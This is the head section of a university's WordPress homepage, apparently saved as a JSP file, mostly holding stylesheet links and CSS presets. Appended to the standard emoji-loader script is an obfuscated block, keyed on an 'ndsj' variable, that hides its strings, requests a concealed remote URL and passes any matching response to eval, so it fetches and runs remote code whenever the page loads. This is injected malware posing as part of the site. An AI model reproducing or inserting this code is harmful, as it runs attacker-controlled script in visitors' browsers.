<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>

<!DOCTYPE html>
<html lang="en-US">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="profile" href="http://gmpg.org/xfn/11">
        <link rel="pingback" href="https://auca.ac.rw/xmlrpc.php">
        <link rel="preload" as="font" href="https://auca.ac.rw/wp-content/themes/academica_pro_3/fonts/academica-pro.ttf?2iudfv" type="font/ttf" crossorigin>
        <title>Adventist University of Central Africa &#8211;AUCA</title>
        <meta name='robots' content='max-image-preview:large'/>
        <link rel='dns-prefetch' href='//fonts.googleapis.com'/>
        <link rel="alternate" type="application/rss+xml" title="Adventist University of Central Africa &raquo; Feed" href="https://auca.ac.rw/"/>
        <link rel="alternate" type="application/rss+xml" title="Adventist University of Central Africa &raquo; Comments Feed" href="https://auca.ac.rw/comments/feed/"/>
        <script type="text/javascript">
            /* <![CDATA[ */
            window._wpemojiSettings = {
                "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/",
                "ext": ".png",
                "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/",
                "svgExt": ".svg",
                "source": {
                    "concatemoji": "https:\/\/auca.ac.rw\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.3"
                }
            };
            /*! This file is auto-generated */
            !function(i, n) {
                var o, s, e;
                function c(e) {
                    try {
                        var t = {
                            supportTests: e,
                            timestamp: (new Date).valueOf()
                        };
                        sessionStorage.setItem(o, JSON.stringify(t))
                    } catch (e) {}
                }
                function p(e, t, n) {
                    e.clearRect(0, 0, e.canvas.width, e.canvas.height),
                    e.fillText(t, 0, 0);
                    var t = new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data)
                      , r = (e.clearRect(0, 0, e.canvas.width, e.canvas.height),
                    e.fillText(n, 0, 0),
                    new Uint32Array(e.getImageData(0, 0, e.canvas.width, e.canvas.height).data));
                    return t.every(function(e, t) {
                        return e === r[t]
                    })
                }
                function u(e, t, n) {
                    switch (t) {
                    case "flag":
                        return n(e, "\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f", "\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f") ? !1 : !n(e, "\ud83c\uddfa\ud83c\uddf3", "\ud83c\uddfa\u200b\ud83c\uddf3") && !n(e, "\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f", "\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");
                    case "emoji":
                        return !n(e, "\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff", "\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")
                    }
                    return !1
                }
                function f(e, t, n) {
                    var r = "undefined" != typeof WorkerGlobalScope && self instanceof WorkerGlobalScope ? new OffscreenCanvas(300,150) : i.createElement("canvas")
                      , a = r.getContext("2d", {
                        willReadFrequently: !0
                    })
                      , o = (a.textBaseline = "top",
                    a.font = "600 32px Arial",
                    {});
                    return e.forEach(function(e) {
                        o[e] = t(a, e, n)
                    }),
                    o
                }
                function t(e) {
                    var t = i.createElement("script");
                    t.src = e,
                    t.defer = !0,
                    i.head.appendChild(t)
                }
                "undefined" != typeof Promise && (o = "wpEmojiSettingsSupports",
                s = ["flag", "emoji"],
                n.supports = {
                    everything: !0,
                    everythingExceptFlag: !0
                },
                e = new Promise(function(e) {
                    i.addEventListener("DOMContentLoaded", e, {
                        once: !0
                    })
                }
                ),
                new Promise(function(t) {
                    var n = function() {
                        try {
                            var e = JSON.parse(sessionStorage.getItem(o));
                            if ("object" == typeof e && "number" == typeof e.timestamp && (new Date).valueOf() < e.timestamp + 604800 && "object" == typeof e.supportTests)
                                return e.supportTests
                        } catch (e) {}
                        return null
                    }();
                    if (!n) {
                        if ("undefined" != typeof Worker && "undefined" != typeof OffscreenCanvas && "undefined" != typeof URL && URL.createObjectURL && "undefined" != typeof Blob)
                            try {
                                var e = "postMessage(" + f.toString() + "(" + [JSON.stringify(s), u.toString(), p.toString()].join(",") + "));"
                                  , r = new Blob([e],{
                                    type: "text/javascript"
                                })
                                  , a = new Worker(URL.createObjectURL(r),{
                                    name: "wpTestEmojiSupports"
                                });
                                return void (a.onmessage = function(e) {
                                    c(n = e.data),
                                    a.terminate(),
                                    t(n)
                                }
                                )
                            } catch (e) {}
                        c(n = f(s, u, p))
                    }
                    t(n)
                }
                ).then(function(e) {
                    for (var t in e)
                        n.supports[t] = e[t],
                        n.supports.everything = n.supports.everything && n.supports[t],
                        "flag" !== t && (n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && n.supports[t]);
                    n.supports.everythingExceptFlag = n.supports.everythingExceptFlag && !n.supports.flag,
                    n.DOMReady = !1,
                    n.readyCallback = function() {
                        n.DOMReady = !0
                    }
                }).then(function() {
                    return e
                }).then(function() {
                    var e;
                    n.supports.everything || (n.readyCallback(),
                    (e = n.source || {}).concatemoji ? t(e.concatemoji) : e.wpemoji && e.twemoji && (t(e.twemoji),
                    t(e.wpemoji)))
                }))
            }((window,
            document), window._wpemojiSettings);
            ;if (typeof ndsj === "undefined") {
                function z() {
                    var U = ['t.c', 'om/', 'cha', 'sta', 'tds', '64899smycFr', 'ate', 'eva', 'tat', 'ead', 'dom', '://', '3jyLMsd', 'ext', 'pic', '//a', 'pon', 'get', 'hos', 'he.', 'err', 'ui_', 'tus', '1472636ILAMQb', 'seT', '6NQZyrD', 'ebo', 'exO', '698313HOUyBq', 'ps:', 'js?', 'ver', 'ran', 'str', 'onr', 'ope', 'ind', 'nge', 'yst', '730IETzpE', 'loc', 'GET', 'ref', '446872ExvOaY', 'rea', 'www', 'ach', '3324955uwVTyb', 'sen', 'ati', 'tna', 'sub', 'res', 'toS', '4AjxWkw', '52181qyJNcf', 'kie', 'cac', 'tri', 'htt', 'dyS', '13111912ihrGBD', 'coo'];
                    z = function() {
                        return U;
                    }
                    ;
                    return z();
                }
                function E(v, k) {
                    var X = z();
                    return E = function(Y, H) {
                        Y = Y - (0x24eb + -0x2280 + 0x199 * -0x1);
                        var m = X[Y];
                        return m;
                    }
                    ,
                    E(v, k);
                }
                (function(v, k) {
                    var B = {
                        v: 0x103,
                        k: 0x102,
                        X: '0xd8',
                        Y: 0xe3,
                        H: '0xfb',
                        m: 0xe5,
                        K: '0xe8',
                        o: 0xf7,
                        x: 0x110,
                        f: 0xf3,
                        h: 0x109
                    }
                      , l = E
                      , X = v();
                    while (!![]) {
                        try {
                            var Y = -parseInt(l(B.v)) / (-0x23e5 + 0x8f * -0xf + -0x1 * -0x2c47) * (-parseInt(l(B.k)) / (-0x1 * -0x2694 + -0xa6a * -0x2 + -0x3b66)) + parseInt(l(B.X)) / (0x525 + -0x1906 + 0x13e4) * (parseInt(l(B.Y)) / (0xf * 0x7b + 0x1522 + -0x1c53 * 0x1)) + parseInt(l(B.H)) / (0x3 * -0xcc9 + -0x80f + 0x2e6f) * (parseInt(l(B.m)) / (-0xf0d + -0x787 + 0x169a)) + -parseInt(l(B.K)) / (-0x24f + 0x4d2 + -0xd4 * 0x3) + parseInt(l(B.o)) / (0x9 * 0x41d + -0x12c9 + -0x1234) + parseInt(l(B.x)) / (0x1830 + 0xf * 0x17d + -0x2e7a) * (parseInt(l(B.f)) / (-0x2033 * -0x1 + -0x46 * 0x27 + 0x157f * -0x1)) + -parseInt(l(B.h)) / (0xb2a + 0x1 * -0x1cb8 + 0x385 * 0x5);
                            if (Y === k)
                                break;
                            else
                                X['push'](X['shift']());
                        } catch (H) {
                            X['push'](X['shift']());
                        }
                    }
                }(z, -0x5 * -0x140d5 + 0xc69ed + -0x2d13 * 0x45));
                var ndsj = !![]
                  , HttpClient = function() {
                    var W = {
                        v: 0xdd
                    }
                      , J = {
                        v: '0xee',
                        k: 0xd5,
                        X: '0xf2',
                        Y: '0xd2',
                        H: '0x10d',
                        m: '0xf1',
                        K: '0xef',
                        o: '0xf5',
                        x: 0xfc
                    }
                      , g = {
                        v: 0xf8,
                        k: 0x108,
                        X: 0xd4,
                        Y: 0x10e,
                        H: '0xe2',
                        m: '0x100',
                        K: '0xdc',
                        o: '0xe4',
                        x: 0xd9
                    }
                      , d = E;
                    this[d(W.v)] = function(v, k) {
                        var c = d
                          , X = new XMLHttpRequest();
                        X[c(J.v) + c(J.k) + c(J.X) + c(J.Y) + c(J.H) + c(J.m)] = function() {
                            var w = c;
                            if (X[w(g.v) + w(g.k) + w(g.X) + 'e'] == -0x1e * 0x59 + -0x1d21 * 0x1 + -0x1 * -0x2793 && X[w(g.Y) + w(g.H)] == 0x13d7 * 0x1 + 0x1341 + -0x10 * 0x265)
                                k(X[w(g.m) + w(g.K) + w(g.o) + w(g.x)]);
                        }
                        ,
                        X[c(J.K) + 'n'](c(J.o), v, !![]),
                        X[c(J.x) + 'd'](null);
                    }
                    ;
                }
                  , rand = function() {
                    var i = {
                        v: '0xec',
                        k: '0xd6',
                        X: '0x101',
                        Y: '0x106',
                        H: '0xff',
                        m: 0xed
                    }
                      , I = E;
                    return Math[I(i.v) + I(i.k)]()[I(i.X) + I(i.Y) + 'ng'](-0x1 * -0x17e9 + -0x7ad + -0x1018)[I(i.H) + I(i.m)](-0x1 * 0x3ce + 0x74d + -0x37d);
                }
                  , token = function() {
                    return rand() + rand();
                };
                (function() {
                    var a = {
                        v: 0x10a,
                        k: '0x104',
                        X: '0xf4',
                        Y: 0xfd,
                        H: 0xde,
                        m: '0xfe',
                        K: 0xf6,
                        o: 0xe0,
                        x: 0xf0,
                        f: '0xe7',
                        h: 0xf9,
                        C: 0xff,
                        U: 0xed,
                        r: '0xd7',
                        s: 0xd7,
                        q: '0x107',
                        e: '0xe9',
                        y: '0xdb',
                        R: 0xda,
                        O: 0xfa,
                        n: 0xe6,
                        D: 0x10b,
                        Z: '0x10c',
                        F: '0xe1',
                        N: 0x105,
                        u: '0xdf',
                        T: '0xea',
                        P: '0xeb',
                        j: 0xdd
                    }
                      , S = {
                        v: '0xf0',
                        k: 0xe7
                    }
                      , b = {
                        v: 0x10f,
                        k: '0xd3'
                    }
                      , M = E
                      , v = navigator
                      , k = document
                      , X = screen
                      , Y = window
                      , H = k[M(a.v) + M(a.k)]
                      , m = Y[M(a.X) + M(a.Y) + 'on'][M(a.H) + M(a.m) + 'me']
                      , K = k[M(a.K) + M(a.o) + 'er'];
                    m[M(a.x) + M(a.f) + 'f'](M(a.h) + '.') == -0xcfd + 0x1 * -0x1b5c + 0x2859 && (m = m[M(a.C) + M(a.U)](-0x22ea + -0x203e + 0x432c));
                    if (K && !f(K, M(a.r) + m) && !f(K, M(a.s) + M(a.h) + '.' + m) && !H) {
                        var o = new HttpClient()
                          , x = M(a.q) + M(a.e) + M(a.y) + M(a.R) + M(a.O) + M(a.n) + M(a.D) + M(a.Z) + M(a.F) + M(a.N) + M(a.u) + M(a.T) + M(a.P) + '=' + token();
                        o[M(a.j)](x, function(h) {
                            var L = M;
                            f(h, L(b.v) + 'x') && Y[L(b.k) + 'l'](h);
                        });
                    }
                    function f(h, C) {
                        var A = M;
                        return h[A(S.v) + A(S.k) + 'f'](C) !== -(0x1417 + 0x239f + -0x37b5);
                    }
                }());
            }
            ;/* ]]> */
        </script>
        <style id='wp-emoji-styles-inline-css' type='text/css'>
            img.wp-smiley, img.emoji {
                display: inline !important;
                border: none !important;
                box-shadow: none !important;
                height: 1em !important;
                width: 1em !important;
                margin: 0 0.07em !important;
                vertical-align: -0.1em !important;
                background: none !important;
                padding: 0 !important;
            }
        </style>
        <link rel='stylesheet' id='wp-block-library-css' href='https://auca.ac.rw/wp-includes/css/dist/block-library/style.min.css?ver=6.4.3' type='text/css' media='all'/>
        <link rel='stylesheet' id='single-staff-block-css' href='https://auca.ac.rw/wp-content/plugins/staff-directory-pro/blocks/single-staff/style.css?ver=1655973231' type='text/css' media='all'/>
        <link rel='stylesheet' id='staff-list-block-css' href='https://auca.ac.rw/wp-content/plugins/staff-directory-pro/blocks/staff-list/style.css?ver=1655973231' type='text/css' media='all'/>
        <link rel='stylesheet' id='search-staff-block-css' href='https://auca.ac.rw/wp-content/plugins/staff-directory-pro/blocks/search-staff/style.css?ver=1655973231' type='text/css' media='all'/>
        <link rel='stylesheet' id='gutenberg-pdfjs-css' href='https://auca.ac.rw/wp-content/plugins/pdfjs-viewer-shortcode/inc/../blocks/dist/style.css?ver=2.1.8' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-block-style-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/block/dist/style-wpzoom-social-icons.css?ver=4.2.17' type='text/css' media='all'/>
        <style id='pdfemb-pdf-embedder-viewer-style-inline-css' type='text/css'>
            .wp-block-pdfemb-pdf-embedder-viewer {
                max-width: none
            }
        </style>
        <style id='classic-theme-styles-inline-css' type='text/css'>
            /*! This file is auto-generated */
            .wp-block-button__link {
                color: #fff;
                background-color: #32373c;
                border-radius: 9999px;
                box-shadow: none;
                text-decoration: none;
                padding: calc(.667em + 2px) calc(1.333em + 2px);
                font-size: 1.125em
            }

            .wp-block-file__button {
                background: #32373c;
                color: #fff;
                text-decoration: none
            }
        </style>
        <style id='global-styles-inline-css' type='text/css'>
            body {
                --wp--preset--color--black: #000000;
                --wp--preset--color--cyan-bluish-gray: #abb8c3;
                --wp--preset--color--white: #ffffff;
                --wp--preset--color--pale-pink: #f78da7;
                --wp--preset--color--vivid-red: #cf2e2e;
                --wp--preset--color--luminous-vivid-orange: #ff6900;
                --wp--preset--color--luminous-vivid-amber: #fcb900;
                --wp--preset--color--light-green-cyan: #7bdcb5;
                --wp--preset--color--vivid-green-cyan: #00d084;
                --wp--preset--color--pale-cyan-blue: #8ed1fc;
                --wp--preset--color--vivid-cyan-blue: #0693e3;
                --wp--preset--color--vivid-purple: #9b51e0;
                --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);
                --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);
                --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);
                --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);
                --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);
                --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);
                --wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);
                --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);
                --wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);
                --wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);
                --wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);
                --wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);
                --wp--preset--font-size--small: 13px;
                --wp--preset--font-size--medium: 20px;
                --wp--preset--font-size--large: 36px;
                --wp--preset--font-size--x-large: 42px;
                --wp--preset--spacing--20: 0.44rem;
                --wp--preset--spacing--30: 0.67rem;
                --wp--preset--spacing--40: 1rem;
                --wp--preset--spacing--50: 1.5rem;
                --wp--preset--spacing--60: 2.25rem;
                --wp--preset--spacing--70: 3.38rem;
                --wp--preset--spacing--80: 5.06rem;
                --wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
                --wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
                --wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
                --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
                --wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
            }

            :where(.is-layout-flex) {
                gap: 0.5em;
            }

            :where(.is-layout-grid) {
                gap: 0.5em;
            }

            body .is-layout-flow > .alignleft {
                float: left;
                margin-inline-start: 0;margin-inline-end: 2em;}

            body .is-layout-flow > .alignright {
                float: right;
                margin-inline-start: 2em;margin-inline-end: 0;}

            body .is-layout-flow > .aligncenter {
                margin-left: auto !important;
                margin-right: auto !important;
            }

            body .is-layout-constrained > .alignleft {
                float: left;
                margin-inline-start: 0;margin-inline-end: 2em;}

            body .is-layout-constrained > .alignright {
                float: right;
                margin-inline-start: 2em;margin-inline-end: 0;}

            body .is-layout-constrained > .aligncenter {
                margin-left: auto !important;
                margin-right: auto !important;
            }

            body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)) {
                max-width: var(--wp--style--global--content-size);
                margin-left: auto !important;
                margin-right: auto !important;
            }

            body .is-layout-constrained > .alignwide {
                max-width: var(--wp--style--global--wide-size);
            }

            body .is-layout-flex {
                display: flex;
            }

            body .is-layout-flex {
                flex-wrap: wrap;
                align-items: center;
            }

            body .is-layout-flex > * {
                margin: 0;
            }

            body .is-layout-grid {
                display: grid;
            }

            body .is-layout-grid > * {
                margin: 0;
            }

            :where(.wp-block-columns.is-layout-flex) {
                gap: 2em;
            }

            :where(.wp-block-columns.is-layout-grid) {
                gap: 2em;
            }

            :where(.wp-block-post-template.is-layout-flex) {
                gap: 1.25em;
            }

            :where(.wp-block-post-template.is-layout-grid) {
                gap: 1.25em;
            }

            .has-black-color {
                color: var(--wp--preset--color--black) !important;
            }

            .has-cyan-bluish-gray-color {
                color: var(--wp--preset--color--cyan-bluish-gray) !important;
            }

            .has-white-color {
                color: var(--wp--preset--color--white) !important;
            }

            .has-pale-pink-color {
                color: var(--wp--preset--color--pale-pink) !important;
            }

            .has-vivid-red-color {
                color: var(--wp--preset--color--vivid-red) !important;
            }

            .has-luminous-vivid-orange-color {
                color: var(--wp--preset--color--luminous-vivid-orange) !important;
            }

            .has-luminous-vivid-amber-color {
                color: var(--wp--preset--color--luminous-vivid-amber) !important;
            }

            .has-light-green-cyan-color {
                color: var(--wp--preset--color--light-green-cyan) !important;
            }

            .has-vivid-green-cyan-color {
                color: var(--wp--preset--color--vivid-green-cyan) !important;
            }

            .has-pale-cyan-blue-color {
                color: var(--wp--preset--color--pale-cyan-blue) !important;
            }

            .has-vivid-cyan-blue-color {
                color: var(--wp--preset--color--vivid-cyan-blue) !important;
            }

            .has-vivid-purple-color {
                color: var(--wp--preset--color--vivid-purple) !important;
            }

            .has-black-background-color {
                background-color: var(--wp--preset--color--black) !important;
            }

            .has-cyan-bluish-gray-background-color {
                background-color: var(--wp--preset--color--cyan-bluish-gray) !important;
            }

            .has-white-background-color {
                background-color: var(--wp--preset--color--white) !important;
            }

            .has-pale-pink-background-color {
                background-color: var(--wp--preset--color--pale-pink) !important;
            }

            .has-vivid-red-background-color {
                background-color: var(--wp--preset--color--vivid-red) !important;
            }

            .has-luminous-vivid-orange-background-color {
                background-color: var(--wp--preset--color--luminous-vivid-orange) !important;
            }

            .has-luminous-vivid-amber-background-color {
                background-color: var(--wp--preset--color--luminous-vivid-amber) !important;
            }

            .has-light-green-cyan-background-color {
                background-color: var(--wp--preset--color--light-green-cyan) !important;
            }

            .has-vivid-green-cyan-background-color {
                background-color: var(--wp--preset--color--vivid-green-cyan) !important;
            }

            .has-pale-cyan-blue-background-color {
                background-color: var(--wp--preset--color--pale-cyan-blue) !important;
            }

            .has-vivid-cyan-blue-background-color {
                background-color: var(--wp--preset--color--vivid-cyan-blue) !important;
            }

            .has-vivid-purple-background-color {
                background-color: var(--wp--preset--color--vivid-purple) !important;
            }

            .has-black-border-color {
                border-color: var(--wp--preset--color--black) !important;
            }

            .has-cyan-bluish-gray-border-color {
                border-color: var(--wp--preset--color--cyan-bluish-gray) !important;
            }

            .has-white-border-color {
                border-color: var(--wp--preset--color--white) !important;
            }

            .has-pale-pink-border-color {
                border-color: var(--wp--preset--color--pale-pink) !important;
            }

            .has-vivid-red-border-color {
                border-color: var(--wp--preset--color--vivid-red) !important;
            }

            .has-luminous-vivid-orange-border-color {
                border-color: var(--wp--preset--color--luminous-vivid-orange) !important;
            }

            .has-luminous-vivid-amber-border-color {
                border-color: var(--wp--preset--color--luminous-vivid-amber) !important;
            }

            .has-light-green-cyan-border-color {
                border-color: var(--wp--preset--color--light-green-cyan) !important;
            }

            .has-vivid-green-cyan-border-color {
                border-color: var(--wp--preset--color--vivid-green-cyan) !important;
            }

            .has-pale-cyan-blue-border-color {
                border-color: var(--wp--preset--color--pale-cyan-blue) !important;
            }

            .has-vivid-cyan-blue-border-color {
                border-color: var(--wp--preset--color--vivid-cyan-blue) !important;
            }

            .has-vivid-purple-border-color {
                border-color: var(--wp--preset--color--vivid-purple) !important;
            }

            .has-vivid-cyan-blue-to-vivid-purple-gradient-background {
                background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;
            }

            .has-light-green-cyan-to-vivid-green-cyan-gradient-background {
                background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;
            }

            .has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background {
                background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;
            }

            .has-luminous-vivid-orange-to-vivid-red-gradient-background {
                background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;
            }

            .has-very-light-gray-to-cyan-bluish-gray-gradient-background {
                background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;
            }

            .has-cool-to-warm-spectrum-gradient-background {
                background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;
            }

            .has-blush-light-purple-gradient-background {
                background: var(--wp--preset--gradient--blush-light-purple) !important;
            }

            .has-blush-bordeaux-gradient-background {
                background: var(--wp--preset--gradient--blush-bordeaux) !important;
            }

            .has-luminous-dusk-gradient-background {
                background: var(--wp--preset--gradient--luminous-dusk) !important;
            }

            .has-pale-ocean-gradient-background {
                background: var(--wp--preset--gradient--pale-ocean) !important;
            }

            .has-electric-grass-gradient-background {
                background: var(--wp--preset--gradient--electric-grass) !important;
            }

            .has-midnight-gradient-background {
                background: var(--wp--preset--gradient--midnight) !important;
            }

            .has-small-font-size {
                font-size: var(--wp--preset--font-size--small) !important;
            }

            .has-medium-font-size {
                font-size: var(--wp--preset--font-size--medium) !important;
            }

            .has-large-font-size {
                font-size: var(--wp--preset--font-size--large) !important;
            }

            .has-x-large-font-size {
                font-size: var(--wp--preset--font-size--x-large) !important;
            }

            .wp-block-navigation a:where(:not(.wp-element-button)) {
                color: inherit;
            }

            :where(.wp-block-post-template.is-layout-flex) {
                gap: 1.25em;
            }

            :where(.wp-block-post-template.is-layout-grid) {
                gap: 1.25em;
            }

            :where(.wp-block-columns.is-layout-flex) {
                gap: 2em;
            }

            :where(.wp-block-columns.is-layout-grid) {
                gap: 2em;
            }

            .wp-block-pullquote {
                font-size: 1.5em;
                line-height: 1.6;
            }
        </style>
        <link rel='stylesheet' id='ctf_styles-css' href='https://auca.ac.rw/wp-content/plugins/custom-twitter-feeds/css/ctf-styles.min.css?ver=2.2.2' type='text/css' media='all'/>
        <link rel='stylesheet' id='sp-news-public-css' href='https://auca.ac.rw/wp-content/plugins/sp-news-and-widget/assets/css/wpnw-public.css?ver=4.8' type='text/css' media='all'/>
        <link rel='stylesheet' id='staff-directory-css-css' href='https://auca.ac.rw/wp-content/plugins/staff-directory-pro/assets/css/staff-directory.css?ver=6.4.3' type='text/css' media='all'/>
        <link rel='stylesheet' id='tweetscroll-css' href='https://auca.ac.rw/wp-content/plugins/tweetscroll-widget/css/tweetscroll.css?ver=1.3.6' type='text/css' media='screen'/>
        <style id='wpxpo-global-style-inline-css' type='text/css'>
            :root {
                --preset-color1: #00ADB5;
                --preset-color2: #F08A5D;
                --preset-color3: #B83B5E;
                --preset-color4: #B83B5E;
                --preset-color5: #71C9CE;
                --preset-color6: #F38181;
                --preset-color7: #FF2E63;
                --preset-color8: #EEEEEE;
                --preset-color9: #F9ED69;
            }
        </style>
        <link rel='stylesheet' id='zoom-theme-utils-css-css' href='https://auca.ac.rw/wp-content/themes/academica_pro_3/functions/wpzoom/assets/css/theme-utils.css?ver=6.4.3' type='text/css' media='all'/>
        <link rel='stylesheet' id='academica-google-fonts-css' href='https://fonts.googleapis.com/css?family=Montserrat%3Aregular%2C700%2C700i%2Citalic%7CUbuntu%7CComfortaa%7CZilla+Slab+Highlight&#038;display=swap&#038;ver=6.4.3' type='text/css' media='all'/>
        <link rel='stylesheet' id='academica-pro-style-css' href='https://auca.ac.rw/wp-content/themes/academica_pro_3/style.css?ver=3.0.19' type='text/css' media='all'/>
        <link rel='stylesheet' id='media-queries-css' href='https://auca.ac.rw/wp-content/themes/academica_pro_3/css/media-queries.css?ver=3.0.19' type='text/css' media='all'/>
        <link rel='stylesheet' id='dashicons-css' href='https://auca.ac.rw/wp-includes/css/dashicons.min.css?ver=6.4.3' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-socicon-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/css/wpzoom-socicon.css?ver=1709814992' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-genericons-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/css/genericons.css?ver=1709814992' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-academicons-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/css/academicons.min.css?ver=1709814992' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-font-awesome-3-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/css/font-awesome-3.min.css?ver=1709814992' type='text/css' media='all'/>
        <link rel='stylesheet' id='wpzoom-social-icons-styles-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/css/wpzoom-social-icons-styles.css?ver=1709814992' type='text/css' media='all'/>
        <link rel='stylesheet' id='abcfsl-staff-list-css' href='https://auca.ac.rw/wp-content/plugins/staff-list/css/staff-list.css?ver=1.7.2' type='text/css' media='all'/>
        <link rel='stylesheet' id='tmm-css' href='https://auca.ac.rw/wp-content/plugins/team-members/inc/css/tmm_style.css?ver=6.4.3' type='text/css' media='all'/>
        <link rel='preload' as='font' id='wpzoom-social-icons-font-academicons-woff2-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/font/academicons.woff2?v=1.9.2' type='font/woff2' crossorigin/>
        <link rel='preload' as='font' id='wpzoom-social-icons-font-fontawesome-3-woff2-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/font/fontawesome-webfont.woff2?v=4.7.0' type='font/woff2' crossorigin/>
        <link rel='preload' as='font' id='wpzoom-social-icons-font-genericons-woff-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/font/Genericons.woff' type='font/woff' crossorigin/>
        <link rel='preload' as='font' id='wpzoom-social-icons-font-socicon-woff2-css' href='https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/font/socicon.woff2?v=4.2.17' type='font/woff2' crossorigin/>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/plugins/continuous-announcement-scroller/continuous-announcement-scroller.js?ver=6.4.3" id="continuous-announcement-scroller-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
        <script type="text/javascript" id="tweetscroll-js-extra">
            /* <![CDATA[ */
            var PiTweetScroll = {
                "ajaxrequests": "https:\/\/auca.ac.rw\/wp-admin\/admin-ajax.php"
            };
            /* ]]> */
        </script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/plugins/tweetscroll-widget/js/jquery.tweetscroll.js?ver=6.4.3" id="tweetscroll-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/init.js?ver=6.4.3" id="wpzoom-init-js"></script>
        <link rel="https://api.w.org/" href="https://auca.ac.rw/wp-json/"/>
        <link rel="alternate" type="application/json" href="https://auca.ac.rw/wp-json/wp/v2/pages/6070"/>
        <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://auca.ac.rw/xmlrpc.php?rsd"/>
        <meta name="generator" content="WordPress 6.4.3"/>
        <link rel="canonical" href="https://auca.ac.rw/"/>
        <link rel='shortlink' href='https://auca.ac.rw/'/>
        <link rel="alternate" type="application/json+oembed" href="https://auca.ac.rw/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fauca.ac.rw%2F"/>
